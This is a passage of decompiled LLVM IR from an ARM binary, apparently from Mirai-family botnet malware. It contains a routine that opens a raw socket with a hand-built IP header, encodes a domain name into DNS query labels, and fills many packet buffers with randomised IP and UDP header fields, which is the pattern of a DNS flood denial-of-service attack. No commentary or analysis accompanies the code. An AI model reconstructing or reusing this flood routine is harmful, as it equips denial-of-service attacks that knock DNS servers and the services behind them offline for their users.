  %v0_d81c = phi i32 [ %v0_d81c29, %dec_label_pc_d7ec ], [ 0, %dec_label_pc_d7d4 ]
  %v0_d7fc = phi i32 [ %v0_d7fc25, %dec_label_pc_d7ec ], [ 0, %dec_label_pc_d7d4 ]
  %v0_d804 = phi i32 [ %v1_d804, %dec_label_pc_d7ec ], [ %v2_d7d4, %dec_label_pc_d7d4 ]
  %v1_d7f8 = inttoptr i32 %v0_d804 to i8*
  %v2_d7f8 = load i8, i8* %v1_d7f8, align 1
  %v3_d7f8 = zext i8 %v2_d7f8 to i32
  store i32 %v3_d7f8, i32* %r3.global-to-local, align 4
  %v2_d7fc = icmp eq i32 %v0_d7fc, 0
  store i1 %v2_d7fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d800, i32* @r4, align 4
  %v1_d804 = add i32 %v0_d804, 1
  store i32 %v1_d804, i32* %r1.global-to-local, align 4
  %v1_d808 = add nsw i32 %v3_d7f8, -48
  store i32 %v1_d808, i32* %r0.global-to-local, align 4
  br i1 %v2_d7fc, label %dec_label_pc_d810, label %dec_label_pc_d820

dec_label_pc_d810:                                ; preds = %dec_label_pc_d7f8
  %v7_d810 = icmp eq i8 %v2_d7f8, 9
  store i1 %v7_d810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d810, label %dec_label_pc_d7ec, label %bb

bb:                                               ; preds = %dec_label_pc_d810
  %v8_d814 = icmp eq i8 %v2_d7f8, 32
  store i1 %v8_d814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d814, label %dec_label_pc_d7ec, label %dec_label_pc_d81c

dec_label_pc_d81c:                                ; preds = %bb
  %v1_d81c = add i32 %v0_d81c, 1
  store i32 %v1_d81c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_d820

dec_label_pc_d820:                                ; preds = %dec_label_pc_d7f8, %dec_label_pc_d81c
  %v0_d81c30 = phi i32 [ %v0_d81c, %dec_label_pc_d7f8 ], [ %v1_d81c, %dec_label_pc_d81c ]
  %v0_d7fc26 = phi i32 [ %v0_d7fc, %dec_label_pc_d7f8 ], [ %v1_d81c, %dec_label_pc_d81c ]
  %v7_d820 = icmp eq i8 %v2_d7f8, 46
  store i1 %v7_d820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d820, label %dec_label_pc_d7e4, label %bb104

bb104:                                            ; preds = %dec_label_pc_d820
  %v8_d824 = icmp eq i32 %v1_d808, 9
  store i1 %v8_d824, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_d808, 10
  br i1 %tmp, label %dec_label_pc_d7e4, label %dec_label_pc_d82c

dec_label_pc_d82c:                                ; preds = %bb104
  br label %dec_label_pc_d830

dec_label_pc_d830:                                ; preds = %dec_label_pc_d7e4, %dec_label_pc_d82c
  %v0_d7ec127 = phi i32 [ %v0_d7ec, %dec_label_pc_d82c ], [ %v1_d800, %dec_label_pc_d7e4 ]
  %v2_d834 = sub i32 %v0_d7ec127, %v0_d7c4
  store i32 %v2_d834, i32* @r4, align 4
  %v2_d838 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_d7d4, i32* %r1.global-to-local, align 4
  store i32 %v2_d838, i32* %r0.global-to-local, align 4
  store i32 %v2_d834, i32* %r2.global-to-local, align 4
  %v3_d848 = call i32 @util_memcpy(i32 %v2_d838, i32 %v2_d7d4, i32 %v2_d834)
  %v2_d84c = ptrtoint i32* %stack_var_-40 to i32
  %v1_d850 = load i32, i32* @r4, align 4
  %v2_d850 = add i32 %v1_d850, %v2_d84c
  store i32 %v2_d850, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d838, i32* @r0, align 4
  %v3_d85c = add i32 %v2_d850, -36
  %v4_d85c = inttoptr i32 %v3_d85c to i8*
  store i8 0, i8* %v4_d85c, align 1
  %v1_d860 = call i32 @inet_addr(i32 %v2_d838)
  store i32 %v1_d860, i32* %r0.global-to-local, align 4
  store i32 %v1_d860, i32* @fp, align 4
  br label %dec_label_pc_d868

dec_label_pc_d86811:                              ; preds = %dec_label_pc_dc64
  unreachable

dec_label_pc_d868:                                ; preds = %dec_label_pc_dcc4, %dec_label_pc_dcbc, %dec_label_pc_dcb0, %dec_label_pc_dca0, %dec_label_pc_d830
  %v1_dc9c50 = phi i32 [ %v1_dc68, %dec_label_pc_dcc4 ], [ %v1_dc68, %dec_label_pc_dcbc ], [ %v1_dc68, %dec_label_pc_dcb0 ], [ %v1_dc68, %dec_label_pc_dca0 ], [ %v1_d860, %dec_label_pc_d830 ]
  %v0_d868 = load i32, i32* @r7, align 4
  %v2_d868 = icmp eq i32 %v0_d868, 0
  store i1 %v2_d868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d868, label %dec_label_pc_dc90, label %dec_label_pc_d870

dec_label_pc_d870:                                ; preds = %dec_label_pc_d868
  store i32 %v0_d868, i32* %r0.global-to-local, align 4
  %v1_d874 = inttoptr i32 %v0_d868 to i8*
  %v2_d874 = call i32 @util_strlen(i8* %v1_d874)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_d874, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d888 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_d888, i32* %r0.global-to-local, align 4
  %v7_d88c = icmp eq i32 %v3_d888, -1
  store i1 %v7_d88c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d88c, label %dec_label_pc_dc90, label %dec_label_pc_d898

dec_label_pc_d898:                                ; preds = %dec_label_pc_d870
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d8a0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d8a0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d8b4 = call i32 @__GI_setsockopt(i32 %v3_d888, i32 0, i32 3, i32 %v6_d8a0, i32 4)
  store i32 %v5_d8b4, i32* %r0.global-to-local, align 4
  %v7_d8b8 = icmp eq i32 %v5_d8b4, -1
  store i1 %v7_d8b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d8b8, label %dec_label_pc_dc88, label %dec_label_pc_d8c0

dec_label_pc_d8c0:                                ; preds = %dec_label_pc_d898
  %v0_d8c8 = load i32, i32* %sb.global-to-local, align 4
  %v1_d8c8 = urem i32 %v0_d8c8, 256
  store i32 %v1_d8c8, i32* %sb.global-to-local, align 4
  %v3_d8d0 = mul i32 %v6_d6d4, 65536
  store i32 %v3_d8d0, i32* %r3.global-to-local, align 4
  %v5_d8dc = trunc i32 %v0_d8c8 to i8
  %v0_d8e0 = load i32, i32* @r8, align 4
  %v2_d8e0 = icmp eq i32 %v0_d8e0, 0
  store i1 %v2_d8e0, i1* %cpsr_z.global-to-local, align 1
  %v3_d8e4 = urem i32 %v7_d678, 65536
  store i32 %v3_d8e4, i32* %r0.global-to-local, align 4
  %v3_d8ec = urem i32 %v6_d6d4, 65536
  store i32 %v3_d8ec, i32* %r2.global-to-local, align 4
  %v3_d8f0 = mul i32 %v6_d6ec, 65536
  %v3_d8f4 = mul i32 %v6_d708, 65536
  store i32 %v3_d8f4, i32* %ip.global-to-local, align 4
  br i1 %v2_d8e0, label %bb105, label %bb106

bb105:                                            ; preds = %dec_label_pc_d8c0
  %v5_d8fc = sext i8 %v5_d8dc to i32
  store i32 %v5_d8fc, i32* %r2.global-to-local, align 4
  br label %bb106

bb106:                                            ; preds = %dec_label_pc_d8c0, %bb105
  %v2_d928 = phi i32 [ %v3_d8ec, %dec_label_pc_d8c0 ], [ %v5_d8fc, %bb105 ]
  %v3_d908 = urem i32 %v6_d6ec, 65536
  store i32 %v3_d908, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_d910 = urem i32 %v6_d708, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_d928 = load i32, i32* @r6, align 4
  br i1 %v2_d8e0, label %.dec_label_pc_db10.preheader_crit_edge, label %dec_label_pc_d930

.dec_label_pc_db10.preheader_crit_edge:           ; preds = %bb106
  %v3_d928 = add i32 %v1_d928, %v2_d928
  store i32 %v3_d928, i32* @r7, align 4
  %.pre = sext i8 %v5_d8dc to i32
  br label %dec_label_pc_db10.preheader

dec_label_pc_d930:                                ; preds = %bb106
  %v2_d930 = add i32 %v1_d928, %v1_d8c8
  %v3_d934 = mul i32 %v2_d930, 65536
  %v1_d93c = add i32 %v3_d934, 1769472
  %v1_d940 = add i32 %v3_d934, 3080192
  %tmp107 = udiv i32 %v1_d940, 256
  %v3_d954 = and i32 %tmp107, 65280
  %v4_d964 = udiv i32 %v1_d940, 16777216
  %v5_d964 = or i32 %v3_d954, %v4_d964
  store i32 %v5_d964, i32* @sl, align 4
  %trunc61 = trunc i32 %v6_d6d4 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc61)
  %tmp108 = mul i32 %v7_d678, 256
  %v3_d978 = and i32 %tmp108, 65280
  store i32 %v3_d978, i32* %r1.global-to-local, align 4
  %tmp109 = udiv i32 %v7_d678, 256
  %v4_d97c = urem i32 %tmp109, 256
  %v5_d97c = or i32 %v4_d97c, %v3_d978
  store i32 %v5_d97c, i32* @sb, align 4
  store i32 %v3_d8f4, i32* %r2.global-to-local, align 4
  store i32 %v3_d8f0, i32* %r0.global-to-local, align 4
  %tmp110 = mul i32 %v6_d6ec, 256
  %v3_d990 = and i32 %tmp110, 65280
  %tmp111 = mul i32 %v6_d708, 256
  %v3_d994 = and i32 %tmp111, 65280
  %tmp112 = udiv i32 %v1_d93c, 256
  %v3_d998 = and i32 %tmp112, 65280
  store i32 %v3_d998, i32* @lr, align 4
  %tmp113 = udiv i32 %v6_d6ec, 256
  %v4_d99c = urem i32 %tmp113, 256
  %v5_d99c = or i32 %v4_d99c, %v3_d990
  store i32 %v5_d99c, i32* %ip.global-to-local, align 4
  %tmp114 = udiv i32 %v6_d708, 256
  %v4_d9a0 = urem i32 %tmp114, 256
  %v5_d9a0 = or i32 %v4_d9a0, %v3_d994
  store i32 %v5_d9a0, i32* @r4, align 4
  %v1_d9a4 = add i32 %v1_d928, 1
  store i32 %v1_d9a4, i32* %r3.global-to-local, align 4
  %v4_d9a8 = udiv i32 %v1_d93c, 16777216
  %v5_d9a8 = or i32 %v4_d9a8, %tmp112
  store i32 0, i32* @r5, align 4
  %sext = mul i32 %v6_d654, 16777216
  %v4_da00 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v6_d690, 16777216
  %v4_da0c = sdiv i32 %sext8, 16777216
  %v4_da2c = sext i8 %v5_d8dc to i32
  %sext9 = mul nuw i32 %v5_d99c, 65536
  %v7_da40 = sdiv i32 %sext9, 65536
  %sext10 = mul nuw i32 %v5_d9a0, 65536
  %v4_da68 = sdiv i32 %sext10, 65536
  %v1_da08 = trunc i32 %v4_da00 to i8
  %extract.t = trunc i32 %v4_da0c to i8
  %v1_da30 = add nsw i32 %v4_da2c, 41
  %sext121 = mul i32 %v5_d9a8, 65536
  %v3_da40 = sdiv i32 %sext121, 65536
  br label %dec_label_pc_d9c0

dec_label_pc_d9c0:                                ; preds = %dec_label_pc_dae0, %dec_label_pc_d930
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_d9c8 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_d9c8, i32* %r0.global-to-local, align 4
  store i32 %v2_d63c, i32* %ip.global-to-local, align 4
  %v3_d9d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d9d0, i32* %r3.global-to-local, align 4
  %v2_d9d4 = load i32, i32* @r5, align 4
  %v5_d9d4 = mul i32 %v2_d9d4, 4
  %v6_d9d4 = add i32 %v5_d9d4, %v2_d63c
  %v7_d9d4 = inttoptr i32 %v6_d9d4 to i32*
  store i32 %v2_d9c8, i32* %v7_d9d4, align 4
  %v0_d9d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_d9d8 = load i32, i32* %r3.global-to-local, align 4
  %v4_d9d8 = mul i32 %v1_d9d8, 4
  %v5_d9d8 = add i32 %v4_d9d8, %v0_d9d8
  %v6_d9d8 = inttoptr i32 %v5_d9d8 to i32*
  %v7_d9d8 = load i32, i32* %v6_d9d8, align 4
  store i32 %v7_d9d8, i32* %r1.global-to-local, align 4
  %v1_d9dc = inttoptr i32 %v7_d9d8 to i8*
  %v2_d9dc = load i8, i8* %v1_d9dc, align 1
  %tmp132 = urem i8 %v2_d9dc, 16
  %v1_d9e0 = zext i8 %tmp132 to i32
  %v1_d9e4 = or i32 %v1_d9e0, 64
  store i32 %v1_d9e4, i32* %r2.global-to-local, align 4
  %v1_d9e8 = trunc i32 %v1_d9e4 to i8
  store i8 %v1_d9e8, i8* %v1_d9dc, align 1
  %v0_d9ec = load i32, i32* %r1.global-to-local, align 4
  %v1_d9ec = inttoptr i32 %v0_d9ec to i8*
  %v2_d9ec = load i8, i8* %v1_d9ec, align 1
  %v3_d9ec = zext i8 %v2_d9ec to i32
  %v1_d9f0 = and i32 %v3_d9ec, 240
  %v1_d9f4 = or i32 %v1_d9f0, 5
  store i32 %v1_d9f4, i32* %r3.global-to-local, align 4
  store i32 %v1_d6bc, i32* %lr.global-to-local, align 4
  %v1_d9fc = trunc i32 %v1_d9f4 to i8
  store i8 %v1_d9fc, i8* %v1_d9ec, align 1
  store i32 %v4_da00, i32* %r0.global-to-local, align 4
  %v0_da04 = load i32, i32* %lr.global-to-local, align 4
  %v2_da04 = icmp eq i32 %v0_da04, 0
  store i1 %v2_da04, i1* %cpsr_z.global-to-local, align 1
  %v2_da08 = load i32, i32* %r1.global-to-local, align 4
  %v3_da08 = add i32 %v2_da08, 1
  %v4_da08 = inttoptr i32 %v3_da08 to i8*
  store i8 %v1_da08, i8* %v4_da08, align 1
  store i32 %v4_da0c, i32* %r2.global-to-local, align 4
  %v0_da10 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da10, label %.thread13, label %bb115

bb115:                                            ; preds = %dec_label_pc_d9c0
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_da14 = load i32, i32* %r1.global-to-local, align 4
  %v4_da14 = add i32 %v3_da14, 6
  %v5_da14 = inttoptr i32 %v4_da14 to i16*
  store i16 64, i16* %v5_da14, align 2
  %v0_da1c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t53 = trunc i32 %v0_da1c.pre to i8
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_d9c0, %bb115
  %v0_da1c.off0 = phi i8 [ %extract.t, %dec_label_pc_d9c0 ], [ %extract.t53, %bb115 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_da1c = load i32, i32* %r1.global-to-local, align 4
  %v3_da1c = add i32 %v2_da1c, 8
  %v4_da1c = inttoptr i32 %v3_da1c to i8*
  store i8 %v0_da1c.off0, i8* %v4_da1c, align 1
  %v0_da20 = load i32, i32* %r3.global-to-local, align 4
  %v1_da20 = trunc i32 %v0_da20 to i8
  %v2_da20 = load i32, i32* %r1.global-to-local, align 4
  %v3_da20 = add i32 %v2_da20, 9
  %v4_da20 = inttoptr i32 %v3_da20 to i8*
  store i8 %v1_da20, i8* %v4_da20, align 1
  %v2_da28 = load i32, i32* @global_var_26e50.101, align 4
  %v0_da30 = load i32, i32* %r1.global-to-local, align 4
  %v2_da34 = add i32 %v1_da30, %v0_da30
  store i32 %v2_da34, i32* @r4, align 4
  %v2_da38 = add i32 %v0_da30, 12
  %v3_da38 = inttoptr i32 %v2_da38 to i32*
  store i32 %v2_da28, i32* %v3_da38, align 4
  store i32 %v3_da40, i32* %r2.global-to-local, align 4
  store i32 %v7_da40, i32* %r3.global-to-local, align 4
  %v0_da44 = load i32, i32* %r1.global-to-local, align 4
  %v1_da44 = add i32 %v0_da44, 20
  store i32 %v1_da44, i32* %ip.global-to-local, align 4
  %v0_da48 = load i32, i32* @sl, align 4
  %v1_da48 = trunc i32 %v0_da48 to i16
  %v3_da48 = add i32 %v0_da44, 2
  %v4_da48 = inttoptr i32 %v3_da48 to i16*
  store i16 %v1_da48, i16* %v4_da48, align 2
  %v0_da4c = load i32, i32* @sb, align 4
  %v1_da4c = trunc i32 %v0_da4c to i16
  %v2_da4c = load i32, i32* %r1.global-to-local, align 4
  %v3_da4c = add i32 %v2_da4c, 4
  %v4_da4c = inttoptr i32 %v3_da4c to i16*
  store i16 %v1_da4c, i16* %v4_da4c, align 2
  %v0_da50 = load i32, i32* %r2.global-to-local, align 4
  %v1_da50 = trunc i32 %v0_da50 to i16
  %v2_da50 = load i32, i32* %ip.global-to-local, align 4
  %v3_da50 = add i32 %v2_da50, 4
  %v4_da50 = inttoptr i32 %v3_da50 to i16*
  store i16 %v1_da50, i16* %v4_da50, align 2
  %v0_da54 = load i32, i32* %r3.global-to-local, align 4
  %v1_da54 = trunc i32 %v0_da54 to i16
  %v2_da54 = load i32, i32* %ip.global-to-local, align 4
  %v3_da54 = add i32 %v2_da54, 2
  %v4_da54 = inttoptr i32 %v3_da54 to i16*
  store i16 %v1_da54, i16* %v4_da54, align 2
  %v2_da5c = load i32, i32* %r1.global-to-local, align 4
  %v3_da5c = add i32 %v2_da5c, 20
  %v4_da5c = inttoptr i32 %v3_da5c to i16*
  store i16 %rev, i16* %v4_da5c, align 2
  store i32 %v4_da2c, i32* %ip.global-to-local, align 4
  %v0_da64 = load i32, i32* %r1.global-to-local, align 4
  %v1_da64 = add i32 %v0_da64, 28
  store i32 %v1_da64, i32* %r0.global-to-local, align 4
  store i32 %v4_da68, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_da74 = add i32 %v0_da64, 30
  %v4_da74 = inttoptr i32 %v3_da74 to i16*
  store i16 1, i16* %v4_da74, align 2
  %v0_da78 = load i32, i32* @lr, align 4
  %v1_da78 = trunc i32 %v0_da78 to i16
  %v2_da78 = load i32, i32* %r0.global-to-local, align 4
  %v3_da78 = add i32 %v2_da78, 4
  %v4_da78 = inttoptr i32 %v3_da78 to i16*
  store i16 %v1_da78, i16* %v4_da78, align 2
  %v0_da7c = load i32, i32* %ip.global-to-local, align 4
  %v1_da7c = trunc i32 %v0_da7c to i8
  %v2_da7c = load i32, i32* %r1.global-to-local, align 4
  %v3_da7c = add i32 %v2_da7c, 40
  %v4_da7c = inttoptr i32 %v3_da7c to i8*
  store i8 %v1_da7c, i8* %v4_da7c, align 1
  %v0_da80 = load i32, i32* @fp, align 4
  %v1_da80 = load i32, i32* %r1.global-to-local, align 4
  %v2_da80 = add i32 %v1_da80, 16
  %v3_da80 = inttoptr i32 %v2_da80 to i32*
  store i32 %v0_da80, i32* %v3_da80, align 4
  %v0_da84 = load i32, i32* %r3.global-to-local, align 4
  %v1_da84 = trunc i32 %v0_da84 to i16
  %v2_da84 = load i32, i32* %r1.global-to-local, align 4
  %v3_da84 = add i32 %v2_da84, 28
  %v4_da84 = inttoptr i32 %v3_da84 to i16*
  store i16 %v1_da84, i16* %v4_da84, align 2
  %v0_da88 = load i32, i32* @r4, align 4
  %v1_da88 = add i32 %v0_da88, 1
  store i32 %v1_da88, i32* %r0.global-to-local, align 4
  %v0_da8c = load i32, i32* @r7, align 4
  store i32 %v0_da8c, i32* %r1.global-to-local, align 4
  store i32 %v1_d9a4, i32* %r2.global-to-local, align 4
  %v3_da94 = call i32 @util_memcpy(i32 %v1_da88, i32 %v0_da8c, i32 %v1_d9a4)
  store i32 %v3_da94, i32* %r0.global-to-local, align 4
  %v0_da98 = load i32, i32* @r6, align 4
  %v2_da98 = icmp eq i32 %v0_da98, 0
  store i1 %v2_da98, i1* %cpsr_z.global-to-local, align 1
  %tmp116 = icmp slt i32 %v0_da98, 1
  br i1 %tmp116, label %bb117, label %dec_label_pc_daa8

bb117:                                            ; preds = %.thread13
  %v5_da9c = load i32, i32* @r4, align 4
  store i32 %v5_da9c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_dae0

dec_label_pc_daa8:                                ; preds = %.thread13
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_daac = load i32, i32* @r4, align 4
  store i32 %v0_daac, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_dab4

dec_label_pc_dab4:                                ; preds = %.thread20, %dec_label_pc_daa8
  %v0_dac0 = phi i32 [ %storemerge, %.thread20 ], [ 0, %dec_label_pc_daa8 ]
  %v0_dac4 = phi i32 [ %v0_dad8, %.thread20 ], [ 0, %dec_label_pc_daa8 ]
  %v1_dab4 = load i32, i32* @r7, align 4
  %v2_dab4 = add i32 %v1_dab4, %v0_dac4
  %v3_dab4 = inttoptr i32 %v2_dab4 to i8*
  %v4_dab4 = load i8, i8* %v3_dab4, align 1
  %v6_dab4 = zext i8 %v4_dab4 to i32
  store i32 %v6_dab4, i32* %r3.global-to-local, align 4
  %v7_dab8 = icmp eq i8 %v4_dab4, 46
  store i1 %v7_dab8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_dab8, label %bb118, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_dab4
  %v1_dac016 = add nsw i32 %v0_dac0, 1
  store i32 %v1_dac016, i32* %r2.global-to-local, align 4
  %v1_dac418 = add i32 %v0_dac4, 1
  store i32 %v1_dac418, i32* %r1.global-to-local, align 4
  br label %bb119

bb118:                                            ; preds = %dec_label_pc_dab4
  %v2_dabc = load i32, i32* @r4, align 4
  %v3_dabc = add i32 %v2_dabc, %v0_dac4
  store i32 %v3_dabc, i32* %r3.global-to-local, align 4
  %v1_dac0 = add nsw i32 %v0_dac0, 1
  store i32 %v1_dac0, i32* %r2.global-to-local, align 4
  %v1_dac4 = add i32 %v0_dac4, 1
  store i32 %v1_dac4, i32* %r1.global-to-local, align 4
  %v2_dac8 = trunc i32 %v0_dac0 to i8
  %v3_dac8 = load i32, i32* %r0.global-to-local, align 4
  %v4_dac8 = inttoptr i32 %v3_dac8 to i8*
  store i8 %v2_dac8, i8* %v4_dac8, align 1
  %v0_dacc.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dacc.pre, label %bb120, label %bb118.bb119_crit_edge

bb118.bb119_crit_edge:                            ; preds = %bb118
  %v1_dacc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb119

bb119:                                            ; preds = %bb118.bb119_crit_edge, %.thread60
  %v1_dacc = phi i32 [ %v1_dacc.pre, %bb118.bb119_crit_edge ], [ %v1_dac016, %.thread60 ]
  %v2_dacc = urem i32 %v1_dacc, 256
  br label %.thread20

bb120:                                            ; preds = %bb118
  %v1_dad0 = load i32, i32* %r3.global-to-local, align 4
  %v2_dad0 = add i32 %v1_dad0, 1
  store i32 %v2_dad0, i32* %r0.global-to-local, align 4
  br label %.thread20

.thread20:                                        ; preds = %bb119, %bb120
  %storemerge = phi i32 [ %v2_dacc, %bb119 ], [ 0, %bb120 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_dad8 = load i32, i32* %r1.global-to-local, align 4
  %v1_dad8 = load i32, i32* @r6, align 4
  %v9_dad8 = icmp eq i32 %v0_dad8, %v1_dad8
  store i1 %v9_dad8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dad8, label %dec_label_pc_dae0.loopexit, label %dec_label_pc_dab4

dec_label_pc_dae0.loopexit:                       ; preds = %.thread20
  %v2_dae0.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t131 = trunc i32 %storemerge to i8
  br label %dec_label_pc_dae0

dec_label_pc_dae0:                                ; preds = %bb117, %dec_label_pc_dae0.loopexit
  %v0_dae0.off0 = phi i8 [ %extract.t131, %dec_label_pc_dae0.loopexit ], [ 0, %bb117 ]
  %v2_dae0 = phi i32 [ %v2_dae0.pre, %dec_label_pc_dae0.loopexit ], [ %v5_da9c, %bb117 ]
  %v3_dae0 = inttoptr i32 %v2_dae0 to i8*
  store i8 %v0_dae0.off0, i8* %v3_dae0, align 1
  %v3_dae4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_dae4, i32* %r3.global-to-local, align 4
  %v1_dae8 = add i32 %v3_dae4, 1
  store i32 %v1_dae8, i32* @r5, align 4
  %v0_daec = load i32, i32* @r4, align 4
  %v1_daec = load i32, i32* @r6, align 4
  %v2_daec = add i32 %v1_daec, %v0_daec
  store i32 %v2_daec, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_daf4 = load i32, i32* @r8, align 4
  %v9_daf4 = icmp eq i32 %v0_daf4, %v1_dae8
  store i1 %v9_daf4, i1* %cpsr_z.global-to-local, align 1
  %v3_daf8 = add i32 %v2_daec, 4
  %v4_daf8 = inttoptr i32 %v3_daf8 to i16*
  store i16 256, i16* %v4_daf8, align 2
  %v0_dafc = load i32, i32* @lr, align 4
  %v1_dafc = trunc i32 %v0_dafc to i16
  %v2_dafc = load i32, i32* %r2.global-to-local, align 4
  %v3_dafc = add i32 %v2_dafc, 2
  %v4_dafc = inttoptr i32 %v3_dafc to i16*
  store i16 %v1_dafc, i16* %v4_dafc, align 2
  %v0_db00 = load i32, i32* @r5, align 4
  store i32 %v0_db00, i32* %stack_var_-44, align 4
  %v8_db04 = icmp sgt i32 %v0_daf4, %v1_dae8
  br i1 %v8_db04, label %dec_label_pc_d9c0, label %dec_label_pc_db08

dec_label_pc_db08:                                ; preds = %dec_label_pc_dae0
  store i32 %v4_da2c, i32* %r0.global-to-local, align 4
  %v0_db0c = load i32, i32* @r6, align 4
  %v2_db0c = add i32 %v0_db0c, %v4_da2c
  store i32 %v2_db0c, i32* @r7, align 4
  %v0_db14.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_db10.preheader

dec_label_pc_db10.preheader:                      ; preds = %.dec_label_pc_db10.preheader_crit_edge, %dec_label_pc_db08
  %v4_db74.pre-phi = phi i32 [ %.pre, %.dec_label_pc_db10.preheader_crit_edge ], [ %v4_da2c, %dec_label_pc_db08 ]
  %v0_db14.pre = phi i32 [ 0, %.dec_label_pc_db10.preheader_crit_edge ], [ %v0_db14.pre.pre, %dec_label_pc_db08 ]
  %v3_db40 = icmp eq i32 %v3_d8e4, 65535
  %v3_db50 = icmp eq i32 %v3_d8ec, 65535
  br label %dec_label_pc_db10

dec_label_pc_db10:                                ; preds = %dec_label_pc_db10, %dec_label_pc_dc08, %dec_label_pc_db10.preheader
  %v0_db14 = phi i32 [ %v0_db14.pre, %dec_label_pc_db10.preheader ], [ 0, %dec_label_pc_dc08 ], [ 0, %dec_label_pc_db10 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_db14 = icmp eq i32 %v0_db14, 0
  store i1 %v2_db14, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_db14, label %dec_label_pc_db10, label %dec_label_pc_db20

dec_label_pc_db20:                                ; preds = %dec_label_pc_db10, %dec_label_pc_dc08
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_db24 = load i32, i32* @r7, align 4
  %v1_db24 = add i32 %v0_db24, 27
  store i32 %v1_db24, i32* @sb, align 4
  %v1_db28 = add i32 %v0_db24, 47
  store i32 %v1_db28, i32* @sl, align 4
  br label %dec_label_pc_db2c

dec_label_pc_db2c:                                ; preds = %dec_label_pc_db70, %dec_label_pc_db20
  %v1_db38 = phi i32 [ %v1_dbf8, %dec_label_pc_db70 ], [ 0, %dec_label_pc_db20 ]
  store i32 %v2_d63c, i32* @r3, align 4
  store i32 %v3_d8e4, i32* @ip, align 4
  %v4_db38 = mul i32 %v1_db38, 4
  %v5_db38 = add i32 %v4_db38, %v2_d63c
  %v6_db38 = inttoptr i32 %v5_db38 to i32*
  %v7_db38 = load i32, i32* %v6_db38, align 4
  store i32 %v7_db38, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_db40, i1* %cpsr_z.global-to-local, align 1
  %v1_db44 = add i32 %v7_db38, 20
  store i32 %v1_db44, i32* @r6, align 4
  br i1 %v3_db40, label %dec_label_pc_dc1c, label %dec_label_pc_db4c

dec_label_pc_db4c:                                ; preds = %dec_label_pc_db2c
  store i32 %v3_d8ec, i32* @lr, align 4
  store i1 %v3_db50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_db50, label %dec_label_pc_dc30, label %dec_label_pc_db58

dec_label_pc_db58:                                ; preds = %dec_label_pc_dc1c.dec_label_pc_db58_crit_edge, %dec_label_pc_db4c
  %v1_db5c = phi i32 [ %v1_db5c.pre, %dec_label_pc_dc1c.dec_label_pc_db58_crit_edge ], [ 65535, %dec_label_pc_db4c ]
  store i32 %v3_d908, i32* %r0.global-to-local, align 4
  %v9_db5c = icmp eq i32 %v3_d908, %v1_db5c
  store i1 %v9_db5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_db5c, label %dec_label_pc_dc44, label %dec_label_pc_db64

dec_label_pc_db64:                                ; preds = %dec_label_pc_dc30, %dec_label_pc_db58
  %v1_db68 = phi i32 [ %v1_dc3c, %dec_label_pc_dc30 ], [ %v1_db5c, %dec_label_pc_db58 ]
  store i32 %v3_d910, i32* %r2.global-to-local, align 4
  %v9_db68 = icmp eq i32 %v3_d910, %v1_db68
  store i1 %v9_db68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_db68, label %dec_label_pc_dc58, label %dec_label_pc_db70

dec_label_pc_db70:                                ; preds = %dec_label_pc_dc44, %dec_label_pc_db64, %dec_label_pc_dc58
  %v0_db70 = load i32, i32* @r4, align 4
  %v1_db70 = add i32 %v0_db70, 41
  store i32 %v1_db70, i32* %r0.global-to-local, align 4
